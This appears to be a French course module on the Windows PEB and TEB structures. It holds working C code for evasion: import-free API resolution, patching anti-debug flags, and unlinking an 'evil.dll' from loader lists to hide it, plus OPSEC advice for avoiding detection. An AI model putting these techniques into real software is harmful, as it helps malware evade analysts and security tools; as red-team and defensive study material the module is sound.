# PEB et TEB (Process/Thread Environment Block)

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- Comprendre les structures PEB et TEB et leur rôle dans Windows
- Accéder au PEB et TEB depuis C/Assembly
- Énumérer les modules chargés via PEB->Ldr
- Exploiter le PEB pour contourner les détections
- Manipuler le TEB pour des techniques avancées
- Masquer des DLLs en modifiant les listes du PEB

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases du langage C (structures, pointeurs)
- Le format PE (module W11_pe_format)
- Les concepts de processus et threads Windows
- L'assembleur x86/x64 (bases)

## Introduction

Le **PEB (Process Environment Block)** et le **TEB (Thread Environment Block)** sont des structures internes non documentées de Windows qui contiennent des informations critiques sur un processus et ses threads. Comprendre ces structures permet d'accéder à des informations système sans appeler d'APIs, ce qui est crucial pour l'évasion.

### Pourquoi ce sujet est important ?

```ascii
PEB/TEB = CARTE D'IDENTITÉ INTERNE D'UN PROCESSUS

┌────────────────────────────────────────────────────┐
│  CONTENU DU PEB                                    │
│  ├─ ImageBaseAddress (adresse du .exe)             │
│  ├─ Ldr (PEB_LDR_DATA) - Liste des DLLs chargées   │
│  ├─ ProcessParameters (ligne de commande, env...)  │
│  ├─ IsBeingDebugged (détection debugger)           │
│  ├─ NtGlobalFlag (indicateurs debug)               │
│  └─ OSMajorVersion, OSMinorVersion                 │
├────────────────────────────────────────────────────┤
│  CONTENU DU TEB                                    │
│  ├─ Self (pointeur vers TEB lui-même)              │
│  ├─ ProcessEnvironmentBlock (pointeur vers PEB)    │
│  ├─ LastErrorValue (GetLastError)                  │
│  ├─ StackBase, StackLimit                          │
│  └─ ThreadLocalStoragePointer                      │
├────────────────────────────────────────────────────┤
│  USAGES OFFENSIFS                                  │
│  ├─ Énumérer DLLs sans APIs (bypass hooks)         │
│  ├─ Résoudre APIs sans GetProcAddress              │
│  ├─ Détecter debuggers (IsBeingDebugged)           │
│  ├─ Masquer DLLs (unhook PEB->Ldr)                 │
│  ├─ Patcher flags anti-debug                       │
│  └─ Accès sans syscalls (TEB->PEB->Ldr)            │
└────────────────────────────────────────────────────┘

Analogie : PEB = Registre interne du processus
           TEB = Badge d'identité du thread
           Accessibles SANS appeler d'APIs = furtif
```

## Concepts fondamentaux

### Concept 1 : Structure du PEB

Le PEB est une structure située en user-land qui contient les métadonnées du processus :

```ascii
LOCALISATION DU PEB :

x64:
  GS:[0x60] → Pointeur vers PEB
  OU
  TEB + 0x60 → PEB

x86:
  FS:[0x30] → Pointeur vers PEB
  OU
  TEB + 0x30 → PEB

┌──────────────────────────────────────────┐
│ PEB STRUCTURE (simplifié)                │
├──────────────────────────────────────────┤
│ +0x000  InheritedAddressSpace           │
│ +0x001  ReadImageFileExecOptions        │
│ +0x002  BeingDebugged ← ANTI-DEBUG      │
│ +0x003  BitField / ImageUsesLargePages  │
│ +0x008  Mutant                           │
│ +0x010  ImageBaseAddress ← .exe base    │
│ +0x018  Ldr → PEB_LDR_DATA ← IMPORTANT  │
│ +0x020  ProcessParameters                │
│ +0x028  SubSystemData                    │
│ +0x030  ProcessHeap                      │
│ +0x038  FastPebLock                      │
│ ...                                      │
│ +0x0BC  NtGlobalFlag ← ANTI-DEBUG       │
│ ...                                      │
│ +0x118  OSMajorVersion                   │
│ +0x11C  OSMinorVersion                   │
│ +0x120  OSBuildNumber                    │
│ +0x124  OSPlatformId                     │
└──────────────────────────────────────────┘
```

**Structure C (partielle)** :

```c
typedef struct _PEB {
    BYTE InheritedAddressSpace;
    BYTE ReadImageFileExecOptions;
    BYTE BeingDebugged;               // +0x002
    BYTE BitField;
    PVOID Mutant;
    PVOID ImageBaseAddress;           // +0x010 (x64)
    PPEB_LDR_DATA Ldr;                // +0x018 (x64)
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters; // +0x020
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    // ...
    ULONG NtGlobalFlag;               // +0x0BC (x86) / +0x0B8 (x64)
    // ...
    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSPlatformId;
} PEB, *PPEB;
```

### Concept 2 : PEB_LDR_DATA - Liste des modules

Le champ `Ldr` pointe vers une structure contenant 3 listes chaînées de modules :

```ascii
PEB_LDR_DATA STRUCTURE :

┌─────────────────────────────────────────────────┐
│ PEB_LDR_DATA                                    │
│ +0x00  Length                                   │
│ +0x04  Initialized                              │
│ +0x08  SsHandle                                 │
│ +0x10  InLoadOrderModuleList ◄──┐              │
│ +0x20  InMemoryOrderModuleList ◄─┼──┐          │
│ +0x30  InInitializationOrderModuleList ◄─┼──┼──┐
└─────────────────────────────────────────┼──┼──┼─┘
                                          │  │  │
    TROIS LISTES CHAÎNÉES (LIST_ENTRY) :  │  │  │
                                          ▼  ▼  ▼
┌──────────────────────────────────────────────────┐
│ InLoadOrder : Ordre de chargement                │
│   ├─ ntdll.dll                                   │
│   ├─ kernel32.dll                                │
│   ├─ user32.dll                                  │
│   └─ ...                                         │
├──────────────────────────────────────────────────┤
│ InMemoryOrder : Ordre en mémoire (par adresse)   │
│   ├─ program.exe                                 │
│   ├─ ntdll.dll                                   │
│   ├─ kernel32.dll                                │
│   └─ ...                                         │
├──────────────────────────────────────────────────┤
│ InInitializationOrder : Ordre d'initialisation   │
│   ├─ kernel32.dll                                │
│   ├─ user32.dll                                  │
│   └─ ...                                         │
└──────────────────────────────────────────────────┘

Chaque entrée = LDR_DATA_TABLE_ENTRY
```

**Structure LDR_DATA_TABLE_ENTRY** :

```c
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;          // +0x00
    LIST_ENTRY InMemoryOrderLinks;        // +0x10
    LIST_ENTRY InInitializationOrderLinks;// +0x20
    PVOID DllBase;                        // +0x30 - Adresse de base
    PVOID EntryPoint;                     // +0x38 - Point d'entrée
    ULONG SizeOfImage;                    // +0x40
    UNICODE_STRING FullDllName;           // +0x48 - Chemin complet
    UNICODE_STRING BaseDllName;           // +0x58 - Nom seul
    // ...
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```

### Concept 3 : Structure du TEB

Le TEB contient des informations spécifiques au thread :

```ascii
TEB STRUCTURE (simplifié) :

┌──────────────────────────────────────────┐
│ +0x000  NtTib (NT_TIB)                   │
│          ├─ ExceptionList                │
│          ├─ StackBase                    │
│          ├─ StackLimit                   │
│          └─ Self (pointeur vers TEB)     │
│ +0x030  EnvironmentPointer               │
│ +0x038  ClientId (PID/TID)               │
│ +0x040  ActiveRpcHandle                  │
│ +0x048  ThreadLocalStoragePointer        │
│ +0x060  ProcessEnvironmentBlock (PEB)    │ ← IMPORTANT
│ +0x068  LastErrorValue ← GetLastError()  │
│ ...                                      │
│ +0x1680 TlsSlots[64]                     │
│ +0x1780 TlsExpansionSlots                │
└──────────────────────────────────────────┘

ACCÈS AU TEB :
  x64: gs:[0] ou __readgsqword(0x30) pour PEB
  x86: fs:[0] ou __readfsdword(0x18) pour TEB
```

### Concept 4 : Accéder au PEB/TEB depuis C

```c
#include <windows.h>
#include <winternl.h>

// Méthode 1 : Via NtCurrentTeb() (ntdll)
PTEB get_teb() {
    return NtCurrentTeb(); // Macro inline assembleur
}

PPEB get_peb() {
    return NtCurrentTeb()->ProcessEnvironmentBlock;
}

// Méthode 2 : Assembleur inline (x64)
PPEB get_peb_asm_x64() {
    return (PPEB)__readgsqword(0x60);
}

// Méthode 3 : Assembleur inline (x86)
#ifdef _M_IX86
PPEB get_peb_asm_x86() {
    PPEB peb;
    __asm {
        mov eax, fs:[0x30]
        mov peb, eax
    }
    return peb;
}
#endif

// Méthode 4 : Via intrinsic (cross-platform)
#ifdef _M_X64
PPEB get_peb_intrinsic() {
    return (PPEB)__readgsqword(0x60);
}
#else
PPEB get_peb_intrinsic() {
    return (PPEB)__readfsdword(0x30);
}
#endif
```

## Mise en pratique

### Étape 1 : Énumérer les modules chargés via PEB

```c
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

void enumerate_modules_via_peb() {
    // Récupérer PEB
    PPEB peb = (PPEB)__readgsqword(0x60); // x64

    // Récupérer PEB_LDR_DATA
    PPEB_LDR_DATA ldr = peb->Ldr;

    // Parcourir InLoadOrderModuleList
    PLIST_ENTRY head = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY current = head->Flink;

    printf("=== MODULES VIA PEB->Ldr ===\n\n");

    while (current != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current,
                                                         LDR_DATA_TABLE_ENTRY,
                                                         InLoadOrderLinks);

        wprintf(L"[0x%p] %wZ (Size: 0x%X)\n",
                entry->DllBase,
                &entry->BaseDllName,
                entry->SizeOfImage);

        current = current->Flink;
    }
}
```

### Étape 2 : Résoudre GetProcAddress manuellement via PEB

```c
// Résoudre adresse d'une fonction sans GetProcAddress
FARPROC resolve_function_via_peb(LPCWSTR moduleName, LPCSTR functionName) {
    // 1. Récupérer PEB
    PPEB peb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA ldr = peb->Ldr;

    // 2. Chercher module
    PLIST_ENTRY head = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY current = head->Flink;

    while (current != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current,
                                                         LDR_DATA_TABLE_ENTRY,
                                                         InLoadOrderLinks);

        if (_wcsicmp(entry->BaseDllName.Buffer, moduleName) == 0) {
            // Module trouvé, parser son Export Table
            PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)entry->DllBase;
            PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)entry->DllBase + pDosHeader->e_lfanew);

            DWORD exportRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            if (exportRVA == 0) return NULL;

            PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)entry->DllBase + exportRVA);

            DWORD* addressTable = (DWORD*)((BYTE*)entry->DllBase + pExportDir->AddressOfFunctions);
            DWORD* nameTable = (DWORD*)((BYTE*)entry->DllBase + pExportDir->AddressOfNames);
            WORD* ordinalTable = (WORD*)((BYTE*)entry->DllBase + pExportDir->AddressOfNameOrdinals);

            // Chercher fonction par nom
            for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
                char* currentName = (char*)((BYTE*)entry->DllBase + nameTable[i]);

                if (strcmp(currentName, functionName) == 0) {
                    WORD ordinal = ordinalTable[i];
                    DWORD funcRVA = addressTable[ordinal];
                    return (FARPROC)((BYTE*)entry->DllBase + funcRVA);
                }
            }
        }

        current = current->Flink;
    }

    return NULL;
}

// Exemple d'utilisation
int main() {
    typedef int (WINAPI *MessageBoxAFunc)(HWND, LPCSTR, LPCSTR, UINT);

    MessageBoxAFunc pMessageBoxA = (MessageBoxAFunc)resolve_function_via_peb(
        L"user32.dll",
        "MessageBoxA"
    );

    if (pMessageBoxA) {
        pMessageBoxA(NULL, "Résolu via PEB!", "Success", MB_OK);
    }

    return 0;
}
```

### Étape 3 : Détection anti-debug via PEB

```c
BOOL check_debugger_via_peb() {
    PPEB peb = (PPEB)__readgsqword(0x60);

    // Vérifier BeingDebugged
    if (peb->BeingDebugged) {
        return TRUE; // Debuggé
    }

    // Vérifier NtGlobalFlag (0x70 si debuggé)
    // En mode debug: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
    if (peb->NtGlobalFlag & 0x70) {
        return TRUE; // Debuggé
    }

    return FALSE;
}

// Contournement : patcher BeingDebugged
void patch_peb_anti_debug() {
    PPEB peb = (PPEB)__readgsqword(0x60);

    peb->BeingDebugged = 0;
    peb->NtGlobalFlag &= ~0x70;

    printf("[+] PEB patché pour bypass anti-debug\n");
}
```

### Étape 4 : Masquer une DLL du PEB (DLL Unlinking)

```c
// Retirer une DLL des listes du PEB (la rend invisible)
BOOL hide_dll_from_peb(LPCWSTR dllName) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA ldr = peb->Ldr;

    // Parcourir InLoadOrderModuleList
    PLIST_ENTRY head = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY current = head->Flink;

    while (current != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current,
                                                         LDR_DATA_TABLE_ENTRY,
                                                         InLoadOrderLinks);

        if (_wcsicmp(entry->BaseDllName.Buffer, dllName) == 0) {
            // Unlink de toutes les listes

            // InLoadOrderLinks
            entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;
            entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;

            // InMemoryOrderLinks
            entry->InMemoryOrderLinks.Flink->Blink = entry->InMemoryOrderLinks.Blink;
            entry->InMemoryOrderLinks.Blink->Flink = entry->InMemoryOrderLinks.Flink;

            // InInitializationOrderLinks
            entry->InInitializationOrderLinks.Flink->Blink = entry->InInitializationOrderLinks.Blink;
            entry->InInitializationOrderLinks.Blink->Flink = entry->InInitializationOrderLinks.Flink;

            printf("[+] DLL '%ws' supprimée du PEB\n", dllName);
            return TRUE;
        }

        current = current->Flink;
    }

    return FALSE;
}

// Exemple : masquer notre DLL malveillante
void WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Récupérer nom de notre DLL
        hide_dll_from_peb(L"evil.dll");
    }
}
```

### Étape 5 : Récupérer la ligne de commande via PEB

```c
void print_commandline_via_peb() {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PRTL_USER_PROCESS_PARAMETERS params = peb->ProcessParameters;

    wprintf(L"Ligne de commande: %s\n", params->CommandLine.Buffer);
    wprintf(L"ImagePathName: %s\n", params->ImagePathName.Buffer);
    wprintf(L"CurrentDirectory: %s\n", params->CurrentDirectory.DosPath.Buffer);

    // Variables d'environnement
    LPWCH env = params->Environment;
    printf("\n=== VARIABLES D'ENVIRONNEMENT ===\n");
    while (*env) {
        wprintf(L"%s\n", env);
        env += wcslen(env) + 1;
    }
}
```

### Étape 6 : Accéder aux TLS (Thread Local Storage) via TEB

```c
void demonstrate_teb_access() {
    PTEB teb = NtCurrentTeb();

    printf("=== TEB INFORMATION ===\n");
    printf("TEB Address: 0x%p\n", teb);
    printf("PEB Address: 0x%p\n", teb->ProcessEnvironmentBlock);
    printf("Thread ID: %u\n", (DWORD)(ULONG_PTR)teb->ClientId.UniqueThread);
    printf("Process ID: %u\n", (DWORD)(ULONG_PTR)teb->ClientId.UniqueProcess);
    printf("LastError: %u\n", teb->LastErrorValue);
    printf("Stack Base: 0x%p\n", teb->NtTib.StackBase);
    printf("Stack Limit: 0x%p\n", teb->NtTib.StackLimit);
}
```

## Application offensive

### Contexte Red Team

Le PEB/TEB est exploité dans de nombreuses techniques offensives :

#### 1. Résolution d'APIs sans imports

Éviter d'avoir des imports suspects dans l'IAT :

```c
// Initialisation des APIs au runtime
typedef HMODULE (WINAPI *LoadLibraryAFunc)(LPCSTR);
typedef FARPROC (WINAPI *GetProcAddressFunc)(HMODULE, LPCSTR);

LoadLibraryAFunc pLoadLibraryA = NULL;
GetProcAddressFunc pGetProcAddress = NULL;

void init_apis_via_peb() {
    // Résoudre LoadLibraryA et GetProcAddress depuis ntdll/kernel32
    pLoadLibraryA = (LoadLibraryAFunc)resolve_function_via_peb(L"kernel32.dll", "LoadLibraryA");
    pGetProcAddress = (GetProcAddressFunc)resolve_function_via_peb(L"kernel32.dll", "GetProcAddress");

    // Maintenant on peut résoudre n'importe quelle API sans import
    HMODULE hNtdll = pLoadLibraryA("ntdll.dll");
    FARPROC pNtAllocateVirtualMemory = pGetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    // ...
}
```

#### 2. DLL Hiding (Rootkit userland)

```ascii
TECHNIQUE DE DLL UNLINKING :

AVANT :
PEB->Ldr->InLoadOrderModuleList:
  ntdll.dll ↔ kernel32.dll ↔ evil.dll ↔ user32.dll

APRÈS UNLINKING :
PEB->Ldr->InLoadOrderModuleList:
  ntdll.dll ↔ kernel32.dll ↔ user32.dll
                              ↑
                          evil.dll (invisible, mais toujours en mémoire)

CONSÉQUENCES :
✓ Invisible à EnumProcessModules()
✓ Invisible à toolhelp32 snapshots
✓ Invisible à Process Hacker / Process Explorer
✗ Toujours détectable par scan mémoire brut
```

#### 3. Bypass anti-debug

```c
// Bypass complet des checks PEB
void bypass_all_peb_checks() {
    PPEB peb = (PPEB)__readgsqword(0x60);

    // Patcher BeingDebugged
    peb->BeingDebugged = 0;

    // Patcher NtGlobalFlag
    peb->NtGlobalFlag &= ~0x70;

    // Patcher ProcessHeap flags (autre technique anti-debug)
    PVOID heap = peb->ProcessHeap;
    if (heap) {
        *(DWORD*)((BYTE*)heap + 0x40) &= ~0x50000062; // Flags
        *(DWORD*)((BYTE*)heap + 0x44) = 0;            // ForceFlags
    }
}
```

#### 4. Parent Process Spoofing

Modifier le PPID dans le PEB (combiné avec NtCreateUserProcess) :

```c
// Spoofing PPID visible dans le PEB
void spoof_parent_process(DWORD newPpid) {
    PPEB peb = (PPEB)__readgsqword(0x60);

    // Via PROCESS_BASIC_INFORMATION (NtQueryInformationProcess)
    // Le vrai PPID est dans le kernel, mais certains outils lisent PEB

    // Modifier InheritedFromUniqueProcessId
    // Note: nécessite technique avancée avec NtCreateUserProcess
}
```

### Considérations OPSEC

```ascii
DÉTECTIONS & MITIGATIONS

┌────────────────────────────────────────────┐
│ INDICATEURS SUSPECTS                       │
│ ├─ Accès répété à PEB (heuristique)        │
│ ├─ Modification de BeingDebugged           │
│ ├─ DLL absente du PEB mais en mémoire      │
│ ├─ Listes PEB corrompues/incohérentes      │
│ └─ ProcessParameters modifiés              │
├────────────────────────────────────────────┤
│ BONNES PRATIQUES                           │
│ ✓ Accéder au PEB le moins possible         │
│ ✓ Unlink DLL uniquement si nécessaire      │
│ ✓ Restaurer état original avant cleanup    │
│ ✓ Combiner avec d'autres techniques        │
│ ✓ Éviter patterns reconnaissables          │
└────────────────────────────────────────────┘

ALTERNATIVES :
- Syscalls directs (ne passe pas par PEB)
- Heaven's Gate (transition WoW64)
- Direct Kernel Object Manipulation (DKOM)
```

## Résumé

- PEB = Process Environment Block, structure userland contenant métadonnées processus
- TEB = Thread Environment Block, informations spécifiques au thread
- Accès : x64 via GS:[0x60] (PEB) ou NtCurrentTeb()
- PEB->Ldr contient 3 listes chaînées des modules chargés
- Usages offensifs : résolution APIs sans imports, DLL hiding, anti-debug bypass
- DLL Unlinking : retirer DLL des listes PEB (invisible aux énumérations)
- PEB.BeingDebugged et NtGlobalFlag = détection anti-debug
- Manipulation directe PEB = furtif (pas d'API calls)
- OPSEC : modifications du PEB détectables par heuristiques avancées

## Ressources complémentaires

- [ReactOS PEB/TEB Structures](https://doxygen.reactos.org/d0/d75/struct__PEB.html)
- [Geoff Chappell: PEB Structure](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm)
- [Vergilius Project: PEB](https://www.vergiliusproject.com/kernels/x64/windows-10/2004/peb)
- [Unlink DLL from PEB](https://www.ired.team/offensive-security/defense-evasion/unlink-dll-from-peb)
- [Anti-Debug via PEB](https://anti-debug.checkpoint.com/techniques/debug-flags.html)

---

**Navigation**
- [Module précédent](../W13_pe_loading/)
- [Module suivant](../W15_memory_management/)
